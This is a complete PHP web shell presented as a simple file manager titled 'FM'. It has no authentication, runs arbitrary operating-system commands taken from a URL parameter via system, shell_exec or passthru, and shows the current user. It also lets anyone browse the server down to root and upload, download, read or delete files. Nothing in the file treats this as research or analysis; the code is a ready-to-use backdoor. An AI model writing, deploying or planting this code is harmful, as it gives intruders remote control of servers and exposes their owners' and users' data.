<?php
error_reporting(0);
@ini_set('display_errors', 0);

function limpiarRuta($ruta) {
    $r = realpath($ruta);
    return ($r !== false) ? $r : getcwd();
}

function tamanoLegible($bytes) {
    if ($bytes == 0) return '0 B';
    $k = 1024; $m = $k * 1024; $g = $m * 1024;
    if ($bytes < $k) return $bytes . ' B';
    if ($bytes < $m) return round($bytes / $k, 2) . ' KB';
    if ($bytes < $g) return round($bytes / $m, 2) . ' MB';
    return round($bytes / $g, 2) . ' GB';
}

function getIcono($archivo) {
    if (is_dir($archivo)) return '[D]';
    $ext = strtolower(pathinfo($archivo, PATHINFO_EXTENSION));
    $map = array('php'=>'PHP','html'=>'HTML','js'=>'JS','css'=>'CSS','txt'=>'TXT','zip'=>'ZIP','jpg'=>'IMG','png'=>'IMG');
    return isset($map[$ext]) ? $map[$ext] : 'FILE';
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = limpiarRuta($dir);
$mensaje = '';
$modalContent = '';

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    if ($action === 'upload' && isset($_FILES['file'])) {
        $target = $dir . '/' . basename($_FILES['file']['name']);
        $mensaje = move_uploaded_file($_FILES['file']['tmp_name'], $target)
            ? 'OK upload: ' . basename($_FILES['file']['name'])
            : 'FAIL upload';
    }
    if ($action === 'download' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (is_file($file) && is_readable($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
        $mensaje = 'FAIL download';
    }
    if ($action === 'view' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (is_file($file) && is_readable($file)) {
            $modalContent = htmlspecialchars(file_get_contents($file));
        } else {
            $mensaje = 'FAIL read';
        }
    }
    if ($action === 'delete' && isset($_GET['file'])) {
        $file = $dir . '/' . basename($_GET['file']);
        if (is_dir($file)) {
            $mensaje = @rmdir($file) ? 'OK rmdir' : 'FAIL rmdir';
        } elseif (is_file($file)) {
            $mensaje = @unlink($file) ? 'OK delete' : 'FAIL delete';
        }
    }
    if ($action === 'mkdir' && isset($_GET['newdir'])) {
        $newdir = $dir . '/' . basename($_GET['newdir']);
        $mensaje = @mkdir($newdir, 0755) ? 'OK mkdir' : 'FAIL mkdir';
    }
    if ($action === 'cmd' && isset($_GET['c'])) {
        echo '<pre>';
        if (function_exists('system')) system($_GET['c'] . ' 2>&1');
        elseif (function_exists('shell_exec')) echo shell_exec($_GET['c'] . ' 2>&1');
        elseif (function_exists('passthru')) passthru($_GET['c'] . ' 2>&1');
        else echo 'no exec';
        echo '</pre>';
        exit;
    }
}

$files = @scandir($dir) ?: array();
$parentDir = dirname($dir);
$currentUser = function_exists('shell_exec') ? trim(@shell_exec('whoami')) : 'n/a';
$dirs = array(); $archivos = array();
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $full = $dir . '/' . $file;
    if (is_dir($full)) $dirs[] = $file; else $archivos[] = $file;
}
sort($dirs); sort($archivos);
$sorted = array_merge($dirs, $archivos);
$self = basename(__FILE__);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>FM</title>
<style>
body{background:#0a0e17;color:#00ff41;font-family:monospace;padding:16px}
a{color:#00ff88} table{width:100%;border-collapse:collapse;border:1px solid #00ff41}
th,td{padding:8px;border-bottom:1px solid #1a2a3a;text-align:left}
.btn{border:1px solid #00ff41;padding:6px 12px;color:#00ff41;text-decoration:none;margin:2px;display:inline-block}
.msg{border:1px solid #ffaa00;padding:8px;margin:8px 0}
pre{background:#111;padding:12px;overflow:auto;max-height:400px}
input,button{background:#0a0e17;border:1px solid #00ff41;color:#00ff41;padding:6px}
</style>
</head>
<body>
<h2>FM | user: <?php echo htmlspecialchars($currentUser); ?> | <?php echo date('Y-m-d H:i:s'); ?></h2>
<div>
  <a class="btn" href="<?php echo $self; ?>?dir=<?php echo urlencode($dir); ?>">reload</a>
  <a class="btn" href="<?php echo $self; ?>?dir=<?php echo urlencode($parentDir); ?>">up</a>
  <a class="btn" href="<?php echo $self; ?>?dir=<?php echo urlencode(getcwd()); ?>">cwd</a>
  <a class="btn" href="<?php echo $self; ?>?dir=/">root</a>
</div>
<p>path: <b><?php echo htmlspecialchars($dir); ?></b></p>
<?php if ($mensaje): ?><div class="msg"><?php echo htmlspecialchars($mensaje); ?></div><?php endif; ?>

<form method="get" style="margin:10px 0">
  <input type="hidden" name="action" value="cmd">
  <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
  cmd: <input name="c" size="50" placeholder="id; ls -la">
  <button type="submit">run</button>
</form>

<table>
<tr><th>name</th><th>size</th><th>perm</th><th>actions</th></tr>
<?php if ($dir !== '/'): ?>
<tr><td colspan="4"><a href="<?php echo $self; ?>?dir=<?php echo urlencode($parentDir); ?>">.. parent</a></td></tr>
<?php endif; ?>
<?php foreach ($sorted as $file):
  $full = $dir . '/' . $file;
  $isDir = is_dir($full);
  $size = $isDir ? 'DIR' : tamanoLegible(@filesize($full));
  $perm = substr(sprintf('%o', @fileperms($full)), -4);
?>
<tr>
  <td>
    <?php if ($isDir): ?>
      <a href="<?php echo $self; ?>?dir=<?php echo urlencode($full); ?>"><?php echo htmlspecialchars($file); ?>/</a>
    <?php else: ?>
      <?php echo htmlspecialchars($file); ?>
    <?php endif; ?>
  </td>
  <td><?php echo $size; ?></td>
  <td><?php echo $perm; ?></td>
  <td>
    <?php if (!$isDir): ?>
      <a href="<?php echo $self; ?>?action=view&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>">view</a>
      <a href="<?php echo $self; ?>?action=download&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>">dl</a>
    <?php endif; ?>
    <a href="<?php echo $self; ?>?action=delete&dir=<?php echo urlencode($dir); ?>&file=<?php echo urlencode($file); ?>" onclick="return confirm('del?')">del</a>
  </td>
</tr>
<?php endforeach; ?>
</table>

<form action="<?php echo $self; ?>?action=upload&dir=<?php echo urlencode($dir); ?>" method="post" enctype="multipart/form-data" style="margin-top:12px">
  <input type="file" name="file" required>
  <button type="submit">upload</button>
</form>

<?php if ($modalContent !== ''): ?>
<h3>view</h3>
<pre><?php echo $modalContent; ?></pre>
<?php endif; ?>
</body>
</html>
